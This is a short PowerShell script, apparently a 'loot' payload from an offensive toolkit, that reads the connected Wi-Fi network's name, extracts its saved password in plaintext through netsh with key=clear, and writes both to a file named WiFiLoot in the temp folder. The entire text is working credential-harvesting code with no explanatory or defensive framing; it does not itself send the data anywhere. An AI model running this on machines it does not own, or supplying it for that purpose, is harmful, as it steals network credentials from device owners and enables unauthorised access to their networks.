$networkProfile = & { 
    $networkProfile = Get-NetConnectionProfile
    $networkName = $networkProfile.Name
    $networkPassword = (netsh wlan show profile name="$networkName" key=clear | Select-String "Key Content").ToString() -replace ".*:\s*(.*)", '$1'
    $hostname = $env:COMPUTERNAME
    $date = Get-Date -Format "yyyyMMdd"
    $filename = "$env:TEMP\WiFiLoot-$hostname-$date.txt"
    $lootData = "Network: $networkName`r`nPassword: $networkPassword"
    $lootData | Out-File -FilePath $filename
    Write-Output "Network details saved to: $filename"
}
